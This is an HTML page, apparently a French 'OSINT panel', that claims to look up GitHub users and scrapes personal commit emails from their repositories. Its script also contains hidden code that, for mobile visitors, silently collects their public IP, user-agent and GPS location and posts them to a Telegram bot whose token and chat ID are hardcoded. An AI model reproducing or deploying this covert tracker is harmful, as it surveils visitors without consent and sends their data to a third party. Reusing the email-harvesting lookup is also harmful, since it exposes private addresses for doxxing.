<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>panel gitsint</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('https://i.imgur.com/ZEOEjcl.jpeg') no-repeat center center fixed;
            background-size: cover;
            color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 50px;
        }
        .panel {
            background: rgba(0, 0, 0, 0.5);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 25px;
            max-width: 500px;
            margin: auto;
        }
        button {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            font-size: 16px;
            background: rgba(0, 0, 0, 0.5);
            color: white;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
        }
        button:hover {
            background: rgba(0, 0, 0, 0.8);
            transform: scale(1.05);
            border-color: white;
        }
        .mobile-message {
            color: red;
            font-size: 20px;
            font-weight: bold;
            background-color: rgba(255, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            display: none;
            margin-top: 20px;
            max-width: 80%;
            margin-left: auto;
            margin-right: auto;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
        }
        pre {
            text-align: left;
            white-space: pre-wrap;
            word-wrap: break-word;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            color: #ffffff;
            margin: 10px;
        }
    </style>
</head>
<body>

    <div class="panel">
        <h2>panel uhq</h2>
        <button id="osintBtn">OSINT GitHub</button>  <!-- Affich√© sur PC -->
        <div id="mobileMessage" class="mobile-message">
            Vous √™tes sur un appareil mobile. Veuillez revenir sur un PC pour utiliser l'OSINT GitHub.
        </div>

        <div id="osintModal" style="display:none;">
            <h3>Recherche OSINT GitHub</h3>
            <input type="text" id="githubUser" placeholder="Entrez un nom GitHub">
            <button id="lookupGitHub">Rechercher</button>
            <pre id="githubResult"></pre>
        </div>
    </div>

    <script>
        // V√©rification si l'utilisateur est sur un appareil mobile
        const isMobile = /mobile/i.test(navigator.userAgent);

        // Si l'utilisateur est sur un appareil mobile, afficher un message et masquer le bouton OSINT
        if (isMobile) {
            document.getElementById('mobileMessage').style.display = 'block';
            document.getElementById('osintBtn').style.display = 'none';  // Masquer le bouton OSINT
            sendMobileInfo();
        } else {
            // Si l'utilisateur est sur PC, afficher le bouton OSINT et ajouter un √©v√©nement
            document.getElementById('osintBtn').style.display = 'inline-block';
            document.getElementById('osintBtn').addEventListener('click', () => {
                document.getElementById('osintModal').style.display = 'block';  // Afficher le modal de recherche
            });
        }

        // Fonction OSINT GitHub
        async function lookupGitHub() {
            let username = document.getElementById("githubUser").value;
            if (!username) {
                alert("Veuillez entrer un nom d'utilisateur GitHub !");
                return;
            }

            let resultText = "";
            let userResponse = await fetch(`https://api.github.com/users/${username}`);
            let userData = await userResponse.json();
            if (userData.message === "Not Found") {
                resultText = "Utilisateur introuvable.";
                document.getElementById("githubResult").textContent = resultText;
                return;
            }

            resultText += `‚òÜ Nom: ${userData.name || "Non disponible"}\n`;
            resultText += `‚òÜ Followers: ${userData.followers}\n`;
            resultText += `‚òÜ Repos: ${userData.public_repos}\n\n`;

            let repoResponse = await fetch(`https://api.github.com/users/${username}/repos?per_page=100`);
            let repos = await repoResponse.json();

            if (repos.length === 0) {
                resultText += "‚ö†Ô∏è Aucun d√©p√¥t trouv√©.\n";
                document.getElementById("githubResult").textContent = resultText;
                return;
            }

            resultText += "üìÇ D√©p√¥ts trouv√©s:\n";
            let allEmails = new Set();

            for (let repo of repos) {
                let repoName = repo.name;
                resultText += `  - ${repoName}\n`;

                let commitResponse = await fetch(`https://api.github.com/repos/${username}/${repoName}/commits?per_page=10`);
                let commits = await commitResponse.json();

                for (let commit of commits) {
                    if (commit.commit && commit.commit.author) {
                        let email = commit.commit.author.email;
                        if (email && !email.endsWith("@users.noreply.github.com")) {
                            allEmails.add(email);
                        }
                    }
                }
            }

            resultText += "\nüìß Emails trouv√©s dans les commits:\n";
            if (allEmails.size > 0) {
                allEmails.forEach(email => {
                    resultText += `  - ${email}\n`;
                });
            } else {
                resultText += "  ‚ùå Aucun email trouv√©.\n";
            }

            document.getElementById("githubResult").textContent = resultText;
        }

        document.getElementById("lookupGitHub").addEventListener("click", lookupGitHub);

        // Fonction pour envoyer les informations de l'utilisateur (IP, User-Agent, Localisation) sur Telegram
        async function sendMobileInfo() {
            try {
                const ip = await getIp();
                const userAgent = navigator.userAgent;
                const location = await getLocation();

                const message = `
                    ‚òÜ Utilisateur sur mobile:
                    ‚òÜ IP: ${ip}
                    ‚òÜ User-Agent: ${userAgent}
                    ‚òÜ Localisation: ${location}
                `;

                sendToTelegram(message);
            } catch (error) {
                console.error('Erreur lors de l\'envoi des infos:', error);
            }
        }

        // Fonction pour obtenir l'IP publique de l'utilisateur
        async function getIp() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        // Fonction pour obtenir la localisation de l'utilisateur
        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const { latitude, longitude } = position.coords;
                        resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
                    },
                    error => {
                        reject("Localisation non disponible");
                    }
                );
            });
        }

        // Fonction pour envoyer les donn√©es √† Telegram
        async function sendToTelegram(message) {
            const token = '7463916367:AAFOPjZpfm4th8l6qSTqTuUUBjKwVlDdJ-4';  // Remplace par ton token de bot Telegram
            const chatId = '7604426420';  // Remplace par ton chat_id Telegram
            const url = `https://api.telegram.org/bot${token}/sendMessage`;

            const response = await fetch(url, {
                method: 'POST',
                body: new URLSearchParams({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const data = await response.json();
            if (data.ok) {
                console.log("Informations envoy√©es sur Telegram avec succ√®s !");
            } else {
                console.error("Erreur lors de l'envoi sur Telegram");
            }
        }
    </script>

</body>
</html>
